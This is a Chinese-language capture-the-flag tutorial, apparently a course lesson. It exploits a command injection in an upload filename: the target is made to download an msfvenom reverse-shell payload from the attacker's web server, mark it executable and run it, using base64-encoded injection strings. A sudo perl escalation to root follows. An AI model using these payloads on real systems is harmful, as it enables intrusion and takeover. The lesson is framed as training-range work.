## 准备工作：生成与监听反弹Shell

上一节我们介绍了如何发现并验证命令注入漏洞。本节中我们来看看如何利用该漏洞获取一个反向连接（反弹Shell）。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_3.png)

首先，我们需要在攻击机（Kali）上设置一个监听器，等待靶场机器主动连接回来。这里我们使用Metasploit框架的`multi/handler`模块。

**步骤1：启动Metasploit并设置监听**

打开终端，输入以下命令：
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.106  # 替换为你的Kali攻击机IP
set LPORT 4444
exploit
```
这条命令启动了一个在4444端口上的TCP监听器，等待接收来自靶场机器的Meterpreter会话。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_5.png)

**步骤2：生成恶意Shell文件**

![](img/947a44cf0f50d37b04dc0fabd409b8a6_7.png)

我们需要生成一个可执行的Shell文件，并放置在攻击机的Web服务器目录下，供靶场机器下载。使用`msfvenom`工具生成。
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=4444 -f elf > /var/www/html/shell.elf
```
这条命令生成了一个名为`shell.elf`的ELF格式可执行文件，并将其输出到Apache的默认Web根目录。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_9.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_11.png)

**步骤3：启动Apache Web服务**

![](img/947a44cf0f50d37b04dc0fabd409b8a6_13.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_15.png)

确保Apache服务正在运行，以便靶场机器可以下载我们生成的Shell文件。
```bash
service apache2 start
```

![](img/947a44cf0f50d37b04dc0fabd409b8a6_17.png)

## 利用漏洞：执行命令注入

准备工作完成后，我们需要通过命令注入漏洞，让靶场机器执行三条命令：下载Shell文件、赋予执行权限、运行该文件。

由于靶场可能部署了防火墙，我们使用Base64编码来绕过检测。以下是需要执行的命令及其Base64编码形式。

**需要执行的三条命令：**

![](img/947a44cf0f50d37b04dc0fabd409b8a6_19.png)

1.  **下载Shell文件**：使用`wget`命令从攻击机下载`shell.elf`文件到靶机的`/tmp`目录，并重命名为`a`。
    *   原始命令：`wget http://192.168.1.106/shell.elf -O /tmp/a`
    *   Base64编码：`d2dldCBodHRwOi8vMTkyLjE2OC4xLjEwNi9zaGVsbC5lbGYgLU8gL3RtcC9h`

![](img/947a44cf0f50d37b04dc0fabd409b8a6_21.png)

2.  **赋予执行权限**：为下载的文件`/tmp/a`赋予可执行权限。
    *   原始命令：`chmod 777 /tmp/a`
    *   Base64编码：`Y2htb2QgNzc3IC90bXAvYQ==`

![](img/947a44cf0f50d37b04dc0fabd409b8a6_23.png)

3.  **执行Shell文件**：运行`/tmp/a`文件，从而触发反弹Shell连接。
    *   原始命令：`/tmp/a`
    *   Base64编码：`L3RtcC9h`

![](img/947a44cf0f50d37b04dc0fabd409b8a6_25.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_27.png)

## 实战操作：通过Burp Suite注入命令

我们将使用Burp Suite拦截并修改上传请求，将上述编码后的命令注入到存在漏洞的`filename`参数中。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_31.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_33.png)

**操作流程如下：**

1.  配置浏览器代理，使用Burp Suite拦截流量。
2.  访问靶场上传页面，选择任意文件进行上传。
3.  在Burp Suite的Proxy模块中拦截到上传请求包，将其发送到Repeater模块进行修改。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_35.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_36.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_38.png)

**以下是每次注入的具体格式：**

在Repeater中，将`filename`参数的值修改为以下格式，然后发送请求。
```php
test.php;system(base64_decode(‘编码后的命令字符串‘));
```

![](img/947a44cf0f50d37b04dc0fabd409b8a6_40.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_42.png)

*   **第一次注入**（下载文件）：
    `filename`参数值设置为：
    ```php
    test.php;system(base64_decode(‘d2dldCBodHRwOi8vMTkyLjE2OC4xLjEwNi9zaGVsbC5lbGYgLU8gL3RtcC9h‘));
    ```
    发送请求后，靶场机器会执行下载命令。

*   **第二次注入**（赋予权限）：
    拦截新的上传请求，将`filename`参数值设置为：
    ```php
    test.php;system(base64_decode(‘Y2htb2QgNzc3IC90bXAvYQ==‘));
    ```
    发送请求。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_44.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_46.png)

*   **第三次注入**（执行Shell）：
    再次拦截上传请求，将`filename`参数值设置为：
    ```php
    test.php;system(base64_decode(‘L3RtcC9h‘));
    ```
    发送请求。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_48.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_50.png)

当第三条命令成功执行后，返回查看之前启动的Metasploit监听窗口，应该已经成功接收到一个来自靶场机器的Meterpreter会话。

## 权限提升与获取Flag

![](img/947a44cf0f50d37b04dc0fabd409b8a6_58.png)

成功获取反弹Shell后，我们通常只有普通用户权限（例如`www-data`）。我们需要将其提升为`root`权限以读取受保护的Flag文件。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_60.png)

**步骤1：检查当前权限和可利用的路径**

![](img/947a44cf0f50d37b04dc0fabd409b8a6_62.png)

在Meterpreter会话中，输入`shell`进入系统命令行，然后执行：
```bash
id
sudo -l
```
`sudo -l`命令列出了当前用户可以以`root`权限运行的命令。输出显示用户`www-data`可以无需密码运行`/usr/bin/perl`。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_64.png)

**步骤2：利用Perl进行权限提升**

![](img/947a44cf0f50d37b04dc0fabd409b8a6_66.png)

利用这个`sudo`权限，我们可以执行以下命令来启动一个具有`root`权限的Bash Shell：
```bash
sudo perl -e ‘exec “/bin/bash”‘
bash -i
```
或者更直接地：
```bash
sudo perl -e ‘exec “/bin/sh”‘
```
执行成功后，命令提示符会变成`#`，表示已获得`root`权限。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_68.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_70.png)

**步骤3：寻找并读取Flag**

Flag文件通常位于根目录或用户主目录下。切换到根目录并列出文件：
```bash
cd /
ls
```
发现`flag.txt`文件后，使用`cat`命令查看其内容：
```bash
cat flag.txt
```
至此，我们成功获取了靶场的Flag值。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_72.png)

![](img/947a44cf0f50d37b04dc0fabd409b8a6_74.png)

## 课程总结 🎯

![](img/947a44cf0f50d37b04dc0fabd409b8a6_76.png)

本节课我们一起学习了命令注入漏洞的完整利用流程：
1.  **信息收集与利用**：在发现漏洞后，优先考虑使用现有的EXP或成熟利用链。
2.  **反弹Shell技术**：通过生成恶意载荷、设置监听器和利用漏洞执行命令，获取远程机器的控制权。
3.  **绕过防护**：使用Base64编码等方式绕过防火墙或安全检测。
4.  **权限提升**：利用系统配置不当（如`sudo`权限）将普通用户权限提升至`root`权限。
5.  **获取Flag**：在获得最高权限后，定位并读取目标Flag文件。

![](img/947a44cf0f50d37b04dc0fabd409b8a6_78.png)

关键点在于，渗透测试是一个循序渐进的过程，需要根据收集到的信息灵活调整策略。对于Web系统，如果存在公开的漏洞利用方式，应优先使用，以提高效率。
